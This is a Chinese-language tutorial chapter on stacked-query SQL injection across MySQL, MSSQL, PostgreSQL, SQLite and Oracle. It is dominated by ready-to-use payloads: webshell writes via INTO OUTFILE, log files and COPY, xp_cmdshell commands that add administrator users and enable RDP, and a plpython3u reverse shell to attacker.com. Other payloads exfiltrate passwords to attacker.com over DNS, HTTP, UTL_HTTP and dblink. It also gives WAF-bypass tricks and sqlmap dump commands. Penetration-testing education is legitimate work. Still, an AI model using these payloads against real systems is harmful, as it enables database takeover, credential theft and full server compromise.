## 4. 堆叠注入（Stacked Queries Injection）

堆叠注入是SQL注入技术中威力最大但也最受限制的一种注入方式。与联合查询注入（UNION-based）只能读取数据不同，堆叠注入允许攻击者在一次请求中执行**任意多条独立的SQL语句**，包括数据操纵（INSERT/UPDATE/DELETE）、数据定义（CREATE/ALTER/DROP）、以及在某些数据库中直接执行操作系统命令。这种能力使堆叠注入从"数据泄露"级别直接跃升为"系统接管"级别。

然而，堆叠注入的触发条件远比其他注入类型苛刻——它依赖于数据库驱动层对多语句执行的支持，而大多数Web应用默认并不开启此功能。理解何时可以使用、如何最大化利用、以及如何防御堆叠注入，是渗透测试者和安全工程师的核心能力之一。

### 4.1 原理与机制

#### 4.1.1 什么是堆叠注入

"堆叠"（Stacked）指的是将多条SQL语句用分号 `;` 连接起来，像堆叠积木一样依次提交给数据库引擎执行。在正常的应用逻辑中，一次查询通常只执行一条SQL语句；但如果后端代码使用了支持多语句执行的API或配置，攻击者就可以通过注入点追加额外的语句。

以PHP + MySQL为例，对比两种API：

```php
// ❌ 不支持堆叠 —— mysqli_query()
$result = mysqli_query($conn, "SELECT * FROM users WHERE id = '$input'");
// 即使注入了 '; DROP TABLE users--'，也只会被当作查询字符串的一部分

// ✅ 支持堆叠 —— mysqli_multi_query()
$result = mysqli_multi_query($conn, "SELECT * FROM users WHERE id = '$input'");
// 注入 '; DROP TABLE users--' 后，DROP TABLE 会被真正执行
```

两者的关键区别在于：`mysqli_multi_query()` 内部调用了MySQL C API的 `mysql_real_query()` 并支持 `CLIENT_MULTI_STATEMENTS` 标志，而 `mysqli_query()` 每次只发送单条语句。

#### 4.1.2 为什么堆叠注入如此强大

| 维度 | UNION注入 | 堆叠注入 |
|------|-----------|----------|
| 读取数据 | ✅ | ✅ |
| 修改数据 | ❌ | ✅ |
| 创建/删除表 | ❌ | ✅ |
| 执行存储过程 | ❌ | ✅ |
| 执行系统命令 | ❌ | ✅（数据库依赖） |
| 绕过WAF难度 | 中 | 较低（语句独立） |
| 可用场景 | 较多 | 较少 |

堆叠注入的核心优势在于：注入的第二条及后续语句是**完全独立执行**的，不受原始查询的上下文约束。UNION注入必须保持列数和数据类型一致，而堆叠注入的每条语句都有完整的语法自由度。

#### 4.1.3 堆叠注入的限制条件

堆叠注入并非万能，其有效性受以下因素制约：

1. **驱动层支持**：后端语言的数据库驱动必须支持多语句执行
2. **数据库类型**：不同数据库的实现差异很大（详见4.2节）
3. **查询结果处理**：即使语句执行了，第二条及后续语句的结果通常无法直接回显到前端
4. **权限控制**：数据库用户的权限决定了可执行的操作范围
5. **WAF/过滤**：虽然堆叠注入绕过WAF相对容易，但分号本身是重点检测对象

> **关键认知**：堆叠注入的"无法回显"问题意味着攻击者通常需要结合时间盲注（`IF()` + `SLEEP()`）、报错注入（`UPDATEXML()` / `EXTRACTVALUE()`）、或DNS外带（`LOAD_FILE()` / `INTO OUTFILE`）来获取数据。

### 4.2 各数据库堆叠注入支持详解

#### 4.2.1 MySQL

**支持情况**：条件性支持，取决于客户端库和配置。

MySQL服务器本身支持多语句执行（从4.1版本开始），但需要客户端在连接时启用 `CLIENT_MULTI_STATEMENTS` 标志（值为 `65536`）。不同的语言/驱动表现不同：

| 语言/驱动 | 支持方式 | 默认状态 |
|-----------|----------|----------|
| PHP `mysqli_multi_query()` | 直接支持 | 显式调用 |
| PHP `PDO` (`ATTR_EMULATE_PREPARES=false`) | 支持 | 需手动设置 |
| PHP `PDO` (`ATTR_EMULATE_PREPARES=true`) | 不支持 | 默认值 |
| Python `MySQLdb` / `mysql-connector` | 默认支持 | 开启 |
| Java `JDBC` (`allowMultiQueries=true`) | 需配置 | 默认关闭 |
| Node.js `mysql` | 默认支持 | 开启 |
| Go `go-sql-driver` | 默认支持 | 开启 |

**实战注入示例**：

```sql
-- 基础：修改管理员密码（知道密码哈希算法的情况）
'; UPDATE users SET password=MD5('hacked123') WHERE username='admin'--

-- 进阶：创建新管理员
'; INSERT INTO users(username, password, role) VALUES('backdoor', MD5('pass123'), 'admin')--

-- 数据外带到文件（需要FILE权限和secure_file_priv允许）
'; SELECT * FROM users INTO OUTFILE '/var/www/html/dump.csv' FIELDS TERMINATED BY ',' ENCLOSED BY '"' LINES TERMINATED BY '\n'--

-- 使用PREPARE语句动态构建（绕过某些关键字过滤）
'; SET @sql = CONCAT('SELECT * FROM ', 'users INTO OUTFILE "/tmp/d.csv"'); PREPARE s FROM @sql; EXECUTE s--

-- 时间盲注方式获取数据（因为后续语句结果不回显）
'; SELECT IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0) FROM users WHERE username='admin'--

-- DNS外带（Windows MySQL + LOAD_FILE + UNC路径）
'; SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\\\file'))--

-- 写入Webshell（需要FILE权限，secure_file_priv为空，知道绝对路径）
'; SELECT '<?php eval($_POST["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php'--
```

**MySQL堆叠注入的常见障碍与绕过**：

```sql
-- 障碍1：secure_file_priv 限制了INTO OUTFILE/LOAD_FILE的路径
-- 绕过：尝试已知可写路径，或利用日志写入
'; SET GLOBAL general_log = ON; SET GLOBAL general_log_file = '/var/www/html/shell.php'; SELECT '<?php system($_GET["c"]);?>'--

-- 障碍2：分号被过滤
-- 绕过：某些场景下可以用 %0a（换行符）代替分号
'%0aUPDATE users SET password=MD5('hack') WHERE username='admin'--

-- 障碍3：后续语句结果无法回显
-- 绕过：使用报错注入将数据带出
'; SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT password FROM users LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a--
```

#### 4.2.2 MSSQL（Microsoft SQL Server）

**支持情况**：默认支持，威力最大。

MSSQL是堆叠注入最强大的平台——它不仅默认支持多语句执行，还提供了 `xp_cmdshell` 存储过程，可以直接执行操作系统命令。这使得MSSQL上的堆叠注入可以直接导致服务器被完全接管。

```sql
-- ===== 基础操作 =====

-- 执行系统命令（需要sysadmin权限或xp_cmdshell权限）
'; EXEC xp_cmdshell 'whoami'--
'; EXEC xp_cmdshell 'ipconfig /all'--

-- 读取文件
'; EXEC xp_cmdshell 'type C:\inetpub\wwwroot\web.config'--
'; EXEC xp_cmdshell 'type C:\Windows\win.ini'--

-- 写入文件（使用BCP导出）
'; EXEC xp_cmdshell 'bcp "SELECT * FROM master.dbo.sysobjects" queryout C:\temp\out.txt -c -T'--

-- ===== xp_cmdshell 启用（当被禁用时） =====

-- 步骤1：启用高级选项
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE--
-- 步骤2：启用xp_cmdshell
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE--

-- 如果sp_configure被限制，尝试直接修改注册表
'; EXEC master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\MSSQLServer\MSSQLServer','AllowFunctionPath','REG_SZ','C:\'--

-- ===== 高级利用 =====

-- 反弹Shell（PowerShell编码后执行）
'; EXEC xp_cmdshell 'powershell -nop -w hidden -e <base64_encoded_command>'--

-- 添加Windows用户
'; EXEC xp_cmdshell 'net user hacker your_password123 /add'--
'; EXEC xp_cmdshell 'net localgroup administrators hacker /add'--

-- 开启RDP
'; EXEC xp_cmdshell 'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'--

-- 使用OLE Automation执行命令（当xp_cmdshell被禁用且无法启用时）
'; DECLARE @s INT; EXEC sp_oacreate 'wscript.shell',@s OUT; EXEC sp_oamethod @s,'run',NULL,'cmd /c whoami > C:\temp\out.txt',0,true--

-- 使用sp_OACreate写入文件
'; DECLARE @f INT; EXEC sp_oacreate 'scripting.filesystemobject',@f OUT; EXEC sp_oamethod @f,'createtextfile',NULL,'C:\temp\test.txt',1; EXEC sp_oamethod @f,'write',NULL,'hello'--
```

**MSSQL堆叠注入的检测与信息收集**：

```sql
-- 判断当前用户权限
'; SELECT IS_SRVROLEMEMBER('sysadmin')--    -- 返回1表示是sysadmin

-- 获取数据库版本
'; SELECT @@VERSION--

-- 列出所有数据库
'; SELECT name FROM master.dbo.sysdatabases--

-- 获取当前数据库名
'; SELECT DB_NAME()--

-- 列出当前数据库的表
'; SELECT name FROM sysobjects WHERE xtype='U'--

-- 判断xp_cmdshell是否可用
'; SELECT COUNT(*) FROM master.dbo.sysobjects WHERE xtype='x' AND name='xp_cmdshell'--

-- 链式数据库攻击（从一个数据库跳到另一个）
'; USE master; EXEC sp_addlogin 'backdoor','password123'--
'; EXEC sp_addsrvrolemember 'backdoor','sysadmin'--
```

#### 4.2.3 PostgreSQL

**支持情况**：条件性支持，需要特定函数和配置。

PostgreSQL的常规查询接口（如 `libpq` 的 `PQexec()`）默认支持多语句执行，但许多高级驱动和ORM会禁用此功能。PostgreSQL的独特优势在于其强大的扩展机制——通过 `COPY` 命令和自定义扩展（如 `plpython3u`），可以实现代码执行。

```sql
-- ===== 基础操作 =====

-- 报错注入获取数据
'; SELECT CAST((SELECT password FROM users LIMIT 1) AS INT)--

-- 延时盲注
'; SELECT pg_sleep(5)--

-- ===== 文件操作 =====

-- 读取文件（需要superuser权限）
'; CREATE TABLE tmp(content text); COPY tmp FROM '/etc/passwd'; SELECT * FROM tmp; DROP TABLE tmp--

-- 写入文件
'; COPY (SELECT '<?php system($_GET["c"]);?>') TO '/var/www/html/shell.php'--

-- ===== 代码执行 =====

-- 通过plpgsql执行命令（需要CREATE权限和信任的语言）
'; CREATE OR REPLACE FUNCTION sys(c text) RETURNS text AS $$ import os; return os.popen(c).read() $$ LANGUAGE plpython3u; SELECT sys('whoami')--

-- 使用plperlu（如果plpython不可用）
'; CREATE OR REPLACE FUNCTION sys(c text) RETURNS text AS $$ my $out = `$_[0]`; return $out; $$ LANGUAGE plperlu; SELECT sys('id')--

-- 创建反弹Shell
'; CREATE OR REPLACE FUNCTION rev() RETURNS void AS $$ import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]) $$ LANGUAGE plpython3u; SELECT rev()--

-- ===== 大对象操作（绕过文件限制） =====

-- 使用大对象写入文件
'; SELECT lo_import('/etc/passwd', 1337); SELECT lo_get(1337); SELECT lo_export(1337, '/tmp/passwd_copy')--
```

**PostgreSQL堆叠注入的实用技巧**：

```sql
-- 当plpython/plperl不可用时，利用dblink扩展进行外带
'; CREATE EXTENSION IF NOT EXISTS dblink; SELECT * FROM dblink('host=attacker.com user=a password=b dbname=c', 'SELECT password FROM users') RETURNS(result text)--

-- 利用pg_read_file读取文件（superuser权限，PostgreSQL 9.1+）
'; SELECT pg_read_file('/etc/passwd', 0, 1000)--

-- 使用COPY TO PROGRAM执行命令（PostgreSQL 9.3+，需要superuser）
'; COPY (SELECT '') TO PROGRAM 'id > /tmp/out.txt'--
```

#### 4.2.4 SQLite

**支持情况**：不支持堆叠注入。

SQLite的C API `sqlite3_exec()` 虽然可以执行多条语句，但大多数绑定库（如PHP的PDO_SQLITE、Python的sqlite3模块）在参数化查询中只执行第一条语句。SQLite没有存储过程、没有用户权限系统、没有文件写入能力（`ATTACH DATABASE` 有极有限的用途），因此堆叠注入即使成功，利用价值也很低。

```sql
-- SQLite通常不支持堆叠注入
-- 即使语法上使用了分号，第二条语句也不会被执行
' ; SELECT 1 -- （不会执行第二条语句）

-- 极少数情况下，如果使用了sqlite3_exec()且未做限制
'; ATTACH DATABASE '/var/www/html/shell.php' AS a; CREATE TABLE a.payload(data TEXT); INSERT INTO a.payload VALUES('<?php system($_GET["c"]);?>')--
```

#### 4.2.5 Oracle

**支持情况**：不支持原生堆叠注入。

Oracle的OCI接口默认不支持多语句执行。要执行PL/SQL块，需要使用 `BEGIN...END` 语法将其包装为一条语句，但这不属于严格意义上的堆叠注入。不过，通过注入PL/SQL匿名块，可以实现类似的效果：

```sql
-- 利用PL/SQL匿名块执行多操作（不是真正的堆叠，但效果类似）
' BEGIN EXECUTE IMMEDIATE 'UPDATE users SET password=''hacked'' WHERE username=''admin'''; END;--

-- 通过DBMS_XMLQUERY报错获取数据
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT password FROM users WHERE rownum=1))--

-- 通过UTL_HTTP外带数据
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/?d='||(SELECT password FROM users WHERE rownum=1)) FROM dual--
```

### 4.3 堆叠注入的回显问题与数据外带技术

堆叠注入面临的最大技术挑战是：**第二条及后续语句的执行结果通常无法通过HTTP响应直接返回**。这是因为Web应用的代码只处理了第一条语句的结果集。攻击者必须借助以下技术来获取数据：

#### 4.3.1 时间盲注法

通过条件延时来逐位提取数据，速度慢但适用性最广：

```sql
-- MySQL：逐字符提取管理员密码
'; SELECT IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(3), 0)--
-- 如果延迟3秒响应，说明第一个字符是'a'，否则继续尝试'b'...

-- MSSQL：使用WAITFOR DELAY
'; IF (SUBSTRING((SELECT TOP 1 password FROM users),1,1)='a') WAITFOR DELAY '0:0:5'--

-- PostgreSQL：使用pg_sleep
'; SELECT CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a' THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

**优化时间盲注效率**：

```sql
-- 使用二分法代替逐字符遍历（将ASCII码范围二分）
'; SELECT IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100, SLEEP(3), 0)--
-- 如果SLEEP了，说明ASCII > 100，继续在101-127之间二分
-- 每个字符只需 log2(128) ≈ 7次请求，比遍历快18倍

-- 并行提取多列（利用嵌套查询）
'; SELECT IF((ASCII(SUBSTRING((SELECT CONCAT(username,0x3a,password) FROM users LIMIT 1),1,1)) & 128) > 0, SLEEP(2), 0)--
-- 使用位运算逐位提取，每字符7次请求
```

#### 4.3.2 报错注入法

利用数据库的错误处理机制将数据嵌入错误消息中：

```sql
-- MySQL：UPDATEXML报错
'; SELECT * FROM (SELECT UPDATEXML(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1),0x7e),1))a--
-- 输出：XPATH syntax error: '~the_actual_password~'

-- MySQL：EXTRACTVALUE报错
'; SELECT * FROM (SELECT EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1))))a--

-- MySQL：FLOOR + RAND + GROUP BY报错（经典双查询报错）
'; SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT password FROM users LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a--

-- MSSQL：CONVERT报错
'; SELECT CONVERT(INT,(SELECT TOP 1 password FROM users))--
-- 输出：Conversion failed when converting the varchar value 'actual_password' to data type int.

-- PostgreSQL：CAST报错
'; SELECT CAST((SELECT password FROM users LIMIT 1) AS INT)--
-- 输出：invalid input syntax for integer: "actual_password"
```

#### 4.3.3 DNS外带法

利用数据库的文件操作功能触发DNS请求，将数据编码为子域名：

```sql
-- MySQL（Windows，需要FILE权限）
'; SELECT LOAD_FILE(CONCAT('\\\\', (SELECT HEX(password) FROM users LIMIT 1), '.attacker.com\\share'))--
-- DNS查询为：5B686173685D.attacker.com，攻击者在DNS服务器记录日志即可还原数据

-- MSSQL（Windows，最可靠的外带方式）
'; DECLARE @d VARCHAR(1024); SELECT @d=(SELECT TOP 1 password FROM users); EXEC('master..xp_dirtree "\\'+@d+'.attacker.com\share"')--

-- 或使用fn_xe_file_target_read_file（SQL Server 2008+）
'; DECLARE @d VARCHAR(1024); SET @d=(SELECT TOP 1 password FROM users); EXEC master..xp_fileexist '\\'+@d+'.attacker.com\c$'--

-- PostgreSQL（需要superuser + dblink扩展）
'; CREATE EXTENSION IF NOT EXISTS dblink; SELECT dblink_connect('host='||(SELECT password FROM users LIMIT 1)||'.attacker.com dbname=test user=a')--
```

> **DNS外带的优势**：不受响应长度限制、不依赖HTTP响应、速度快、可绕过大部分WAF（DNS流量通常不被监控）。缺点是仅限Windows环境（UNC路径机制）。

#### 4.3.4 带外HTTP请求法

利用数据库的HTTP客户端功能将数据发送到攻击者服务器：

```sql
-- MSSQL：使用OLE Automation
'; DECLARE @o INT; EXEC sp_oacreate 'MSXML2.XMLHTTP', @o OUT; EXEC sp_oamethod @o, 'open', NULL, 'GET', 'http://attacker.com/?d='+(SELECT password FROM users WHERE id=1), false; EXEC sp_oamethod @o, 'send'--

-- PostgreSQL：使用dblink或pg_http扩展
'; SELECT * FROM dblink('host=attacker.com port=80 dbname='||(SELECT password FROM users LIMIT 1), 'SELECT 1') AS t(f TEXT)--

-- Oracle：UTL_HTTP
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/?p='||(SELECT password FROM users WHERE rownum=1)) FROM dual--
```

### 4.4 WAF绕过与高级技巧

#### 4.4.1 分号检测与绕过

分号是堆叠注入的核心符号，也是WAF的重点检测对象。常见的绕过方式：

```sql
-- 方式1：使用换行符替代分号（MySQL支持）
'%0ASELECT * FROM users INTO OUTFILE '/tmp/d.csv'--

-- 方式2：URL双重编码
%253B → 解码后为 %3B → 再解码为 ;

-- 方式3：使用CHAR()函数构造分号
' CHAR(59) SELECT ... （某些场景可行）

-- 方式4：注释分隔
'/**/;/**/SELECT/**/password/**/FROM/**/users/**/INTO/**/OUTFILE/**/'/tmp/d.csv'--

-- 方式5：大小写混合
'SeLeCt * FROM users INTO OUTFILE '/tmp/d.csv'--

-- 方式6：利用HPP（HTTP参数污染）
id=1; SELECT * FROM users INTO OUTFILE '/tmp/d.csv'&id=1'--
-- 有些WAF只检查第一个参数

-- 方式7：使用0x3b十六进制编码（在某些上下文中）
```

#### 4.4.2 关键字过滤绕过

```sql
-- 当SELECT被过滤时
-- 使用子查询嵌套
'; (SELECT password FROM users LIMIT 1) INTO OUTFILE '/tmp/d.csv'--

-- 使用UNION构造（如果UNION未被过滤）
'; SELECT * FROM (SELECT 1 UNION SELECT password FROM users LIMIT 1)a INTO OUTFILE '/tmp/d.csv'--

-- 当INTO OUTFILE被过滤时
-- 使用日志文件写入（MySQL）
'; SET GLOBAL general_log=ON; SET GLOBAL general_log_file='/var/www/html/s.php'; SELECT '<?php eval($_POST["c"]);?>'--

-- 当空格被过滤时
-- 使用括号包裹
';(SELECT(password)FROM(users)LIMIT(1))INTO(OUTFILE('/tmp/d.csv'))--

-- 使用/**/注释代替空格
';SELECT/**/password/**/FROM/**/users/**/INTO/**/OUTFILE/**/'/tmp/d.csv'--

-- 使用+号（MSSQL）
';SELECT+password+FROM+users--

-- 当等号被过滤时
'; UPDATE users SET password LIKE 'hacked%' WHERE username LIKE 'admin%'--
```

#### 4.4.3 利用堆叠注入绕过WAF的独特优势

堆叠注入相比联合注入有一个独特的WAF绕过优势：**注入的第二条语句在语法上是独立的**，不受原始查询的格式约束。这意味着：

1. 不需要匹配原始查询的列数和数据类型
2. 可以使用完全不同的查询结构
3. 可以将敏感操作放在第二条语句中，而第一条语句保持"干净"

```sql
-- WAF可能只分析第一条语句的上下文
-- 示例：原始查询是SELECT，WAF检查SELECT上下文
-- 但注入的UPDATE是独立语句，可能绕过SELECT上下文的检查

' ;UPDATE users SET password=MD5('hack') WHERE username='admin'--
-- WAF的语法分析器可能只检查了第一个SELECT部分
```

### 4.5 检测与识别堆叠注入

#### 4.5.1 手动检测方法

```sql
-- 步骤1：确认普通注入点
?id=1' --+          -- 正常回显
?id=1' AND 1=1 --+  -- 正常回显
?id=1' AND 1=2 --+  -- 回显变化

-- 步骤2：尝试堆叠注入
?id=1'; SELECT SLEEP(5)--+
-- 如果延迟5秒，说明支持堆叠注入

-- 步骤3：区分延迟来源
-- 确认不是因为AND 1=1; SELECT SLEEP(5)被整体当作条件
?id=1' AND (SELECT 1)=1; SELECT SLEEP(5)--+
-- 如果仍然延迟，说明确实是堆叠执行

-- 步骤4：测试后续语句是否真正执行
?id=1'; CREATE TABLE IF NOT EXISTS test_stack(id INT);--+
-- 如果无报错，再用其他方式确认表是否被创建
```

#### 4.5.2 SQLMap堆叠注入检测

```bash
# SQLMap会自动检测堆叠注入支持
sqlmap -u "http://target.com/page?id=1" --technique=S --level=3 --risk=3

# --technique=S 表示只测试堆叠注入
# --level=3 提高测试深度
# --risk=3 允许使用高风险测试（如时间盲注）

# 强制使用堆叠注入获取数据
sqlmap -u "http://target.com/page?id=1" --technique=ST --batch --dump

# 测试堆叠注入的可用性
sqlmap -u "http://target.com/page?id=1" --technique=S --test-filter="stacked"
```

### 4.7 实战案例：完整堆叠注入攻击链

  测试: id=1'; WAITFOR DELAY '0:0:5'--+ → 延迟5秒 ✓
  结论：支持堆叠注入

  id=1'; SELECT COUNT(*) FROM master.sysobjects WHERE name='xp_cmdshell' AND xtype='x'-- → 返回1

  id=1'; EXEC xp_cmdshell 'whoami'-- → nt authority\system

### 4.8 常见误区与纠正

| 误区 | 正确理解 |
|------|----------|
| "所有数据库都支持堆叠注入" | 只有MSSQL默认支持，MySQL需要特定API，PostgreSQL条件支持，SQLite和Oracle不支持 |
| "堆叠注入可以直接看到第二条语句的结果" | 通常不能，需要结合时间盲注/报错注入/DNS外带 |
| "参数化查询就绝对安全" | 参数化查询阻止注入，但如果应用使用了多语句API且存在其他注入点，堆叠仍有风险 |
| "禁用分号就能防堆叠注入" | 换行符（%0a）在MySQL中也可以分隔语句 |
| "堆叠注入只能用在GET参数" | POST参数、Cookie、HTTP Header都可以是注入点 |
| "WAF一定能拦截堆叠注入" | WAF检测分号和关键字组合，但编码、注释、HPP等技术可以绕过 |
| "Oracle完全不受堆叠注入影响" | Oracle虽然不支持堆叠，但可以通过PL/SQL匿名块和XML函数实现类似效果 |

### 4.10 本节小结

堆叠注入是SQL注入技术体系中"威力天花板"般的存在。它的核心价值在于突破了查询上下文的限制，允许攻击者执行任意SQL语句。但它的核心挑战在于：

1. **触发条件苛刻**——依赖驱动层多语句支持
2. **回显困难**——后续语句结果通常无法直接获取
3. **数据库差异大**——MSSQL最强，MySQL次之，PostgreSQL条件支持，SQLite和Oracle基本不可用

在渗透测试中，堆叠注入是判断SQL注入严重程度的关键指标——如果目标存在堆叠注入，那么该漏洞的评级应当直接提升至"严重"或"高危"，因为它意味着攻击者拥有对数据库的完整控制权，甚至可能直接接管服务器。
